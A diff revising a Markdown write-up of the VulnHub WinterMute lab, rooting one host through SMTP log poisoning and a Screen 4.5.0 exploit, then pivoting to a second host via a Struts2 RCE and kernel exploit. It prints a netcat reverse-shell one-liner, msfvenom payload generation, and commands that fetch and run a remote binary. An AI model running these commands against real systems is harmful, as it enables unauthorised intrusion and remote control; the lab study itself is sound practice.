@@ -1,104 +1,93 @@
-There are two machines to target in this assessment. The first has two NICs, one external and one internal. The second has one internal that is available by the first machine only. The goal is to attack and get root on the first box and then pivot 
-## Discovery
+---
+tags:
+  - box
+platform: VulnHub
+os: Linux
+difficulty:
+date_completed:
+mitre_attack: T1078, T1190, T1505.003, T1068, T1552.001, T1090
+status: rooted
+---
 
-#Nmap 
+## Target
+
+Two machines in this assessment. The first (Stray Light) has two NICs - one external, one internal. The second (Neuromancer) is only reachable from the first. Goal: root the first box, then pivot to root the second.
+
+## Recon
+
+### Discovery
+
+#Nmap
 
 ```bash
 sudo nmap -oN -sn 192.168.1.0/24
 ```
 
-###   Findings:
+#### Findings
 
-Target 1
-**IP Address: 192.168.1.108**
+Target 1 (Stray Light) - **IP Address: 192.168.1.108**
 
-## Recon
+### Port Scan
 
-#Nmap 
+#Nmap
 
 ```bash
 sudo nmap -T4 -O -sV -sC -p- -oA strayLight 192.168.1.108
 ```
 
-###   Findings:
+#### Findings
 
-![[strayLightNmap.png]]
+![strayLightNmap](../../Images/WinterMute/strayLightNmap.png)
 
-| Port  | Service     | Version          |
-| ----- | ----------- | ---------------- |
-| 25    | SMTP   | Postfix smtpd |
-| 80    | HTTP   | Apache httpd 2.4.25 |
-| 3000  | HTTP  | Apache Hadoop Task Tracker |
+| Port | Service | Version |
+|---|---|---|
+| 25 | SMTP | Postfix smtpd |
+| 80 | HTTP | Apache httpd 2.4.25 |
+| 3000 | HTTP | Apache Hadoop Task Tracker |
 
-The versions for hadoop and httpd do not seem to be vulnerable, but the smtpd might be if I can find a full version number.
+Hadoop and httpd versions don't look vulnerable on their own; smtpd might be if a full version can be pinned down.
 
-Navigating to the web page game the following image with a glitch effect. After a little bit of time on the page I got redirected to a new page with a message being written on the screen.
+The web page shows a glitch-effect image, then redirects to a message being typed onto the screen after a moment.
 
-![[Images/WinterMute/homePage.png]]
+![homePage](../../Images/WinterMute/homePage.png)
+![redirectedMessage](../../Images/WinterMute/redirectedMessage.png)
 
-The following image is the page that I was redirected to after a few seconds.
-
-![[redirectedMessage.png]]
-
-So far this is nothing too interesting and there are no comments in the source code of the websites either. I am going to run a dirb scan to see if there are any hidden pages or directories.
+No comments in source on either page. Ran dirb variations:
 
 ```bash
 dirb http://192.168.1.108
-```
-```bash
 dirb http://192.168.1.108 /usr/share/usr/wordlists/dirb/big.txt
-```
-```bash
 dirb http://192.168.1.108 -X .txt,.py,.php,.perl,.bak
-```
-```bash
-dirb http://192.168.1.108 /usr/share/wordlists/dirb/big.txt -X 
-.txt,.py,.php,.perl,.bak
-```
-```bash
+dirb http://192.168.1.108 /usr/share/wordlists/dirb/big.txt -X .txt,.py,.php,.perl,.bak
 dirb http://192.168.1.108 /usr/share/wordlists/dirb/vulns/apache.txt
 ```
 
-Dirb scan only showed one result of the manual
+Only found the Apache manual page - worth noting given the specific Apache version.
 
-![[apacheManualPage.png]]
-
-The Apache Manual page is open, this could be vulnerable based on the version of Apache.
+![apacheManualPage](../../Images/WinterMute/apacheManualPage.png)
 
 ```bash
 sudo nmap --script=*hadoop* -p 3000 192.168.1.108
-```
-
-I ran nmap scripts on the port with hadoop to see if nmap would find something, but nothing came back from the results
-
-```bash
 sudo nmap --script=*smtp* -p 25 192.168.1.108
 ```
 
-I ran nmap scripts on the smtp port and got back some results but unfortunately nothing useful. It says that it doesn't seem to be an open relay, it is not vulnerable to cve-2010-4344, and RCPT returned an unhandled status code.
+Hadoop scripts returned nothing useful. SMTP scripts confirmed it's not an open relay, not vulnerable to CVE-2010-4344, and RCPT returns an unhandled status code. Need a username to try other SMTP-based login methods.
 
-Need to see if I can find some username to test other methods of logging into this server through smtp
-
-![[hadoopLogin.png]]
+![hadoopLogin](../../Images/WinterMute/hadoopLogin.png)
 
 ## Enumeration
 
-I navigated to the hadoop page and was greeted with a login screen that has a lot of good information on it
-    Version is ntopng
-    Hint at the bottom of the page saying the default username and password are admin
+The "hadoop" page is actually an ntopng login screen, with a hint that default creds are admin/admin.
 
-![[hadoopLoggedIn.png]]
+![hadoopLoggedIn](../../Images/WinterMute/hadoopLoggedIn.png)
 
-I was able to log in using the default creds that were mentioned on the log in screen and am logged in to the admin interface
+Logged in with the default creds - ntopng version 2.4.180512, which searchsploit flags as vulnerable (not confirmed for this exact patch level yet).
 
-![[ntopngVersion.png]]
+![ntopngVersion](../../Images/WinterMute/ntopngVersion.png)
 
-It looks like the server is running ntopng version 2.4.180512
-    Searchsploit says that version 2.4 is vulnerable, not sure if it will work on this version or not
+Viewed all users on the page - only the admin account exists.
 
-![[ntopngUsers.png]]
-
-I am able to view all of the users on the page, but it seems that the admin account is the only one on it
+![ntopngUsers](../../Images/WinterMute/ntopngUsers.png)
 
 ```bash
 telnet 192.168.1.108 25
@@ -107,288 +96,221 @@ telnet 192.168.1.108 25
 vrfy wintermute
 ```
 
-I was able to use telnet to log in to the smtp server and get a user name
-    Wintermute
+Confirmed a valid SMTP username: `wintermute`.
 
-![[vrfyWintermuteUser.png]]
+![vrfyWintermuteUser](../../Images/WinterMute/vrfyWintermuteUser.png)
 
-Looking through the ntopng console and the web traffic that is being generated, I saw a link being hit for "turing-bolo" on the localhost http port. Navigating to the page on port 80 of this server got a web page.
+Watching ntopng's traffic view, saw a hit for "turing-bolo" on localhost port 80. Navigated there.
 
-![[activeFlowsNtopng.png]]
+![activeFlowsNtopng](../../Images/WinterMute/activeFlowsNtopng.png)
+![turing-BoloPage](../../Images/WinterMute/turing-BoloPage.png)
+![boloCase](../../Images/WinterMute/boloCase.png)
 
-![[turing-BoloPage.png]]
+Selecting "case" from a list returned case info; other entries in the list:
 
-![[boloCase.png]]
+![boloMolly](../../Images/WinterMute/boloMolly.png)
+![boloArmitage](../../Images/WinterMute/boloArmitage.png)
+![boloRiviera](../../Images/WinterMute/boloRiviera.png)
 
-I selected case from the list on the page and submitted the query and got the above page giving some information on the user case. The rest of the users in the list are below.
+Another entry, "freeside," led to a separate page with just an image.
 
-![[boloMolly.png]]
+![freesidePage](../../Images/WinterMute/freesidePage.png)
 
-![[boloArmitage.png]]
+Noticed the "turing-bolo" page is a PHP script pulling per-person data via a `case` URL parameter, while other entries used `name.log` - suggesting it's reading log files by name. Possible LFI/path traversal.
 
-![[boloRiviera.png]]
+![turingPagePHPParameter](../../Images/WinterMute/turingPagePHPParameter.png)
 
-Saw another entry in the list on ntopng web console for something called "freeside," navigated there and got a different webpage with just an image
+Tried `/etc/passwd` directly in the parameter - no luck; the script appears to append `.log` automatically. Tried a known log path instead, `/var/log/mail`, and got a response.
 
-![[freesidePage.png]]
+![mailLogFile](../../Images/WinterMute/mailLogFile.png)
 
-Looking back at the turing page, "turing-bolo" I was realized that the website was running a php script to pull the specific queries for each person. If you look at the URL it is putting a php parameter of "case" for the first one and then for each other person as well. Everywhere else it seems to be using the name.log instead though, so maybe this is pulling a log file from the system.
-    Could this be a possible file traversal/LFI possibility?
+## Exploitation
 
-![[turingPagePHPParameter.png]]
+With log-file read access confirmed, the plan became log poisoning via the SMTP `telnet` connection - inject PHP into the mail log, then have the LFI-like script execute it.
 
-I tried to put /etc/passwd in to the parameter, but that did not work. It seems that the script is doing something else than just taking a parameter.
+Found a similar remote command injection exploit for a different Postfix SMTP version in searchsploit - not an exact version match, but close enough in behavior to adapt. That script builds a message sent to the server to land in the logs; since the server runs PHP, crafted a PHP snippet looking for a `CMD` parameter to run arbitrary commands.
 
-Looking at the way that the script is taking a parameter, it seems that it is taking a log file and then appending the .log to the parameter after. With this assumption, I tried a log file that I knew would be on the system, the mail log file /var/log/mail and I got a response
+![remoteCodeInjectionScript](../../Images/WinterMute/remoteCodeInjectionScript.png)
+![sendingCodeToSmtpLog](../../Images/WinterMute/sendingCodeToSmtpLog.png)
 
-![[mailLogFile.png]]
-
-With this I might be able to add something to the log file in order to do some log poisoning and run some remote code using the telnet SMTP connection.
-
-There is a vulnerability in Searchsploit that is a remote command injection for postfix smtp. It is not the version that this server is running, but since it is doing the same thing I am going to see what it is doing and see if I can replicate it with this.
-
-The python script is creating a message that it sends to the server to put it in the logs. Since I know that the server is running PHP I sent it a PHP blurb that is looking for a parameter CMD so that I can send a command for the server to run.
-
-![[remoteCodeInjectionScript.png]]
-
-![[sendingCodeToSmtpLog.png]]
-
-I tried a reverse shell with regular sh command and tried it URL encoded, but it didn't work. It seems to be messing up for some reason. I am going to try other methods.
-
-It worked! I was able to get a reverse shell using this remote code injection.
-I used a netcat reverse shell and url encoded it and then sent it to the system
+Plain `sh` and URL-encoded reverse shell attempts didn't work - eventually succeeded with a URL-encoded netcat FIFO reverse shell:
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.85 4444 >/tmp/f
 ```
-
 ```urlencoded
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.1.85%204444%20%3E%2Ftmp%2Ff
 ```
 
-![[reverseShellCaught.png]]
-
-## Recon
+![reverseShellCaught](../../Images/WinterMute/reverseShellCaught.png)
 
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-I was able to get a TTY shell and read the /etc/passwd file and see that there are two other users on the system
-    wintermute
-    turing-police
+Got a TTY, read `/etc/passwd` - two more users: `wintermute`, `turing-police`.
 
-![[etcPasswdStraylight.png]]
+![etcPasswdStraylight](../../Images/WinterMute/etcPasswdStraylight.png)
 
-I was able to read the home directories of each user, but both were empty other than the default files
+Both home directories were otherwise empty. Checked for unusual setuid binaries: `ping` and `screen-4.5.0` stood out.
 
-I was able to find all of the files that have the UID set and found a few that are not normal to find
-    Ping
-    Screen-4.5.0
+![UIDSet](../../Images/WinterMute/UIDSet.png)
 
-![[UIDSet.png]]
+## Privilege Escalation (Stray Light)
 
-## Enumeration
+Screen 4.5.0 has a known root exploit (https://www.exploit-db.com/exploits/41154). Copied it to the attack machine, served it with Python's HTTP server, and transferred it over.
 
-There is a vulnerability in Screen-4.5 that should allow me to get root access on the system.
+![screenKillerFile](../../Images/WinterMute/screenKillerFile.png)
+![httpServerStart](../../Images/WinterMute/httpServerStart.png)
+![fileTransferStraylight](../../Images/WinterMute/fileTransferStraylight.png)
 
-https://www.exploit-db.com/exploits/41154
+Ran the script - got a root shell.
 
-I was able to copy over the exploit to my attack machine and then start an http server with Python to transfer over the file to the target machine.
+![screenKillerRunning](../../Images/WinterMute/screenKillerRunning.png)
 
-![[screenKillerFile.png]]
+## Flags
 
-![[httpServerStart.png]]
+**Root (Stray Light):** captured.
 
-![[fileTransferStraylight.png]]
+![strayLightRootFlag](../../Images/WinterMute/strayLightRootFlag.png)
 
-I was then able to run the script and achieved a root shell on the system and was able to read the flag.
+---
 
-![[screenKillerRunning.png]]
+## Pivot: Neuromancer
 
-## PWNED
-
-![[strayLightRootFlag.png]]
-
-## Discovery
-
-Now that I have root on this system, I am going to find the next target subnet and victim.
+With root on Stray Light, looked for the next target/subnet.
 
 ```bash
 ifconfig
 ```
 
-![[strayLightIfconfig.png]]
+![strayLightIfconfig](../../Images/WinterMute/strayLightIfconfig.png)
 
-It seems that this machine is has a second NIC that is on the subnet of 10.0.2.0/24 and is currently assigned the IP of 10.0.2.4
+Second NIC on 10.0.2.0/24, assigned 10.0.2.4. ARP table showed 10.0.2.3 - not confirmed as the target yet. Ran a ping sweep to populate the ARP table further.
 
-If I look at the ARP table for this machine, I found an entry for 10.0.2.3. I am not sure yet if this is the other machine, but I will keep searching
-
-![[strayLightArpTable.png]]
-
-I ran a ping sweep on the network to create traffic to populate the arp table further and find all the hosts on this network
+![strayLightArpTable](../../Images/WinterMute/strayLightArpTable.png)
 
 ```meterpreter
 run post/multi/gather/ping_sweep rhosts=10.0.2.0/24
 ```
 
-![[strayLightPingSweep.png]]
+![strayLightPingSweep](../../Images/WinterMute/strayLightPingSweep.png)
 
-Looking at the arp table now brings up some new results that has the next target machine in it
+New ARP entries revealed the actual target: **IP Address: 10.0.2.5**
 
-![[strayLightUpdatedArpTable.png]]
+![strayLightUpdatedArpTable](../../Images/WinterMute/strayLightUpdatedArpTable.png)
 
-The matching IP address is 10.0.2.5
+## Recon (Neuromancer)
 
-**IP Address: 10.0.2.5** 
+A note left in Stray Light's root directory mentions an open API on this next system.
 
-## Recon
-
-There is a note on the root directory of the Stray Light system that tells about an open api on the system that I might be able to exploit and get on with.
-
-![[strayLightNote.png]]
-
-I created a route to the subnet through meterpreter so that I can scan the target machine and get the open ports
+![strayLightNote](../../Images/WinterMute/strayLightNote.png)
 
 ```meterpreter
 run autoroute -s 10.0.2.0/24
 ```
 
-Open ports on the target machine
-    8009
-    8080
-    34483
-
-I created a port forward to the three above ports using the below command and scanned it with nmap to see what the ports are running
+Open ports found: 8009, 8080, 34483.
 
 ```meterpreter
 portfwd add -l 10000 -p 8009 -r 10.0.2.5
 ```
-
 ```bash
 sudo nmap -sV -sC -p 10000-10002 127.0.0.1
 ```
 
-| Port  | Service     | Version          |
-| ----- | ----------- | ---------------- |
-| 8009  | snet-sensor-mgmt   | Not Found |
-| 8080  | scp-config   | Not Found |
-| 34483 | ssh         | OpenSSH 7.2p2    |
+| Port | Service | Version |
+|---|---|---|
+| 8009 | snet-sensor-mgmt | not found |
+| 8080 | scp-config | not found |
+| 34483 | ssh | OpenSSH 7.2p2 |
 
-One of these ports must be an HTTP server because of what the note said. I know it isn't port 34483 because it that is SSH, nmap couldn't identify the other ports so I will need to use netcat or something else to identify what they are
+Since the note mentioned an HTTP server, and 34483 is SSH, needed to identify 8009/8080 manually.
 
-![[strayLightNetcatPorts.png]]
+![strayLightNetcatPorts](../../Images/WinterMute/strayLightNetcatPorts.png)
 
 ```bash
 nc -nv 10.0.2.5 8009
-```
-```bash
 nc -nv 10.0.2.5 8080
 ```
 
-I found that port 8080 seems to be the http server. I can't tell what version the port is running, but the port is showing http at least
-
-I am going to see if I can connect to the directory that was in the note
-
-I was not able to access it with the port forward through meterpreter but I was able to create a new port forward with socat and access the site that way
+8080 is the HTTP server (version unclear from netcat alone). The Meterpreter port forward didn't let me reach the noted directory, so used socat instead:
 
 ```bash
-socat tcp-listen:5555, fork tcp:10.0.2.5:8080
+socat tcp-listen:5555,fork tcp:10.0.2.5:8080
 ```
 
-![[neuromancerTomcatPage.png]]
+![neuromancerTomcatPage](../../Images/WinterMute/neuromancerTomcatPage.png)
 
-Once on the site I can see that the server is running an Apache Tomcat server on it but I don't see an exact version yet.
+Apache Tomcat running (exact version still unclear). Navigated to the directory from the note: `/struts2_2.3.15.1-showcase`.
 
-I navigated to the directory that was mentioned in the note and was able to get to that page
-    /struts2_2.3.15.1-showcase
+![neuromancerStrutsShowcasePage](../../Images/WinterMute/neuromancerStrutsShowcasePage.png)
 
-![[neuromancerStrutsShowcasePage.png]]
+Struts version 2.3.15 - searchsploit has an RCE for Struts 2.3.x showcase, and this is exactly that showcase app.
 
-It seems that this server is running struts version 2.3.15 and when I ran a searchsploit search on this version I was able to find a remote code execution exploit for struts version 2.3.x showcase. Fortunately for me, that is exactly what this page is
+![neuromancerStrutsVulnerabilitySearch](../../Images/WinterMute/neuromancerStrutsVulnerabilitySearch.png)
 
-![[neuromancerStrutsVulnerabilitySearch.png]]
+## Exploitation (Neuromancer)
 
-Running the exploit, it is wanting the url and the command and it is sending the command to the page using a vulnerability in the way that the page is building the java processes
+The exploit takes a URL and a command, exploiting how the page builds Java processes. Tried a socat relay for a reverse shell:
 
 ```bash
 socat tcp-listen:4443,fork tcp:192.168.1.85:4443
 ```
 
-I opened a socat listener to forward traffic to my machine from the remote machine and tried a few different options for reverse shells, but I was unable to get a connection from the machine
+Several reverse shell payload attempts failed to connect - switched to a compiled msfvenom payload instead:
 
-I am going to try and craft an executable through msfvenom to see if that will work instead
-
-```msfvenom
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4443 -f elf -o revShell
 ```
 
-
-```python
+```bash
 python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget -O /tmp/revShell 10.0.2.4:4443/revShell"
-```
-```python
 python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/revShell"
-```
-```python
 python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "/tmp/revShell"
 ```
 
-After this I was able to go back into my sessions and see that I had an active connection with the target machine neuromancer
+Got a session back as user `ta`.
 
-I was able to run an ID command to see that I was logged in as a user named "ta" and then ran "cat /etc/passwd" to see all of the users that are on the machine
+![neuromancerIDPasswd](../../Images/WinterMute/neuromancerIDPasswd.png)
 
-![[neuromancerIDPasswd.png]]
+`/etc/passwd` shows two accounts: `ta` and `lady3jane`. Logged in as `ta` but without a password, privileges are unclear.
 
-There are two different account on this machine
-    ta
-    lady3jane
+Found `ai-gui-guide.txt` in ta's home directory, revealing install locations worth searching for credentials.
 
-I am logged in as ta but I do not have the password, so I can't see my privileges yet
+![neuromancrAiGuide](../../Images/WinterMute/neuromancrAiGuide.png)
 
-Now that I am on the system, I start looking at the different files that I have access to
+Found lady3jane's password, encoded, inside the Tomcat files.
 
-There is a file in the home directory of ta called ai-gui-guide.txt and I was able to look at its contents
+![lady3janePasswordEncoded](../../Images/WinterMute/lady3janePasswordEncoded.png)
 
-![[neuromancrAiGuide.png]]
+Decoded: `>!Xx3JanexX!<`
 
-Here I am able to see where all of the different install locations are and by seeing this I know exactly where to look user files that might have some passwords in them
+Logged in as lady3jane - no sudo rights either. Setuid-based privesc paths exist but need sudo access to leverage.
 
-Looking in the tomcat files I was able to fine lady3jane's password, but it is encoded
+![neuromancerSetUID](../../Images/WinterMute/neuromancerSetUID.png)
 
-![[lady3janePasswordEncoded.png]]
+## Privilege Escalation (Neuromancer)
 
-Decoding this I was able to get the password as
-    >!Xx3JanexX!<
+LinPEAS flagged both a vulnerable sudo version and a vulnerable kernel version.
 
-I was able to log in as lady3jane and now I can see if I have sudo privileges as this user
+![neuromancerSudoAndKernelVersion](../../Images/WinterMute/neuromancerSudoAndKernelVersion.png)
 
-Unfortunately I am not able to run sudo as this user and I will need to find another path onto the system now
-
-There are some paths for privilege escalation with set UID bits, but I can't use them without being able to run sudo 
-
-![[neuromancerSetUID.png]]
-
-After running linpeas I was able to find that there is an exploit with the sudo version that this system is running that I might be able to exploit as well as the kernel version that I may be able to exploit as well
-
-![[neuromancerSudoAndKernelVersion.png]]
-
-This sudo version has an exploit in searchsploit that I can use to get root access, unfortunately I need the ta password in order to run this exploit and I still don't have that so it won't work
-
-Luckily the linux kernel looks like it may work for me. There is a local privilege escalation exploit for this exact kernel version that looks like it is going to work to get root. I just have to get it on the system somehow to run it
-
-I had to compile it on my machine and then move it over to the target because the target did not have a C compiler on it. I also had to do a static compile of the exploit because the libraries were not on the target machine.
+The sudo exploit needs ta's password, which isn't available. The kernel LPE, however, doesn't need a password. No C compiler on the target, so compiled statically on the attack machine:
 
 ```bash
 gcc -static -o privEsc 44298.c
 ```
 
-Once compiled, I used scp to transfer the file over to the target and use an ssh session through the socat tunnel to run the exploit and this got me the root shell.
+Transferred with scp over an SSH session through the socat tunnel, and ran the exploit.
 
-## PWNED
+## Flags
 
-![[neuromancerRootShell.png]]
+**Root (Neuromancer):** captured.
 
-Now as root I am able to read the flag that is in the root directory and I have finished this box.
+![neuromancerRootShell](../../Images/WinterMute/neuromancerRootShell.png)
+![neuromancerRootFlag](../../Images/WinterMute/neuromancerRootFlag.png)
 
-![[neuromancerRootFlag.png]]
+## Lessons Learned
+
+This box chained two very different exploitation styles: SMTP log poisoning (crafting a message so it lands in a log file the web app then executes as PHP) to root the first host, then a full Metasploit-based pivot (autoroute + portfwd/socat) to reach and root a second, internal-only host via a Struts2 showcase RCE. Worth remembering for future pivots: if Meterpreter's own `portfwd` won't reach a service, `socat` run from the already-compromised host is a solid fallback relay.
